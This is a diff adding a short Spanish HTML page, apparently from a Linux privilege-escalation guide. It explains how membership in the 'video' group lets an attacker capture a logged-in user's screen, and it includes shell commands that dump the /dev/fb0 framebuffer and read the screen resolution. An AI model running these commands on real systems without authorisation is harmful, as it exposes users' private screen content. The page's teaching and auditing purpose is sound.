@@ -1,0 +1,25 @@
+<h1>Grupo Video</h1>
+
+<h2><i class="bi bi-check-circle me-2"></i></i>Explicación</h2>
+<p class="mainText">
+    El grupo <b>video</b> controla el acceso a los dispositivos de video en el sistema, como tarjetas gráficas y dispositivos de captura de video.
+</p>
+
+<h2><i class="bi bi-check-circle me-2"></i></i>Ataque</h2>
+<p class="mainText">
+    Un atacante podría utilizar los permisos del grupo <b>video</b> para espiar la pantalla de un usuario conectado al sistema y recopilar información 
+    potencialmente sensible.
+</p>
+<!-- Code snipet-->
+<div class="snipet_custom position-relative">
+<pre class="code_snipet"><code data-language="shell">#Leer en formato RAW un fotograma de la pantalla con
+cat /dev/fb0 > /tmp/screen.raw
+#Para recoger la resolución de la pantalla
+cat /sys/class/graphics/fb0/virtual_size
+</code></pre>
+</div>
+<!-- Code-->
+<p class="mainText">
+    A partir de aquí, podríamos intentar abrir el archivo con un editor de imágenes como GIMP para ver la captura. (Es importante recordar la resolución de 
+    la pantalla para poder reconstruirla)
+</p>
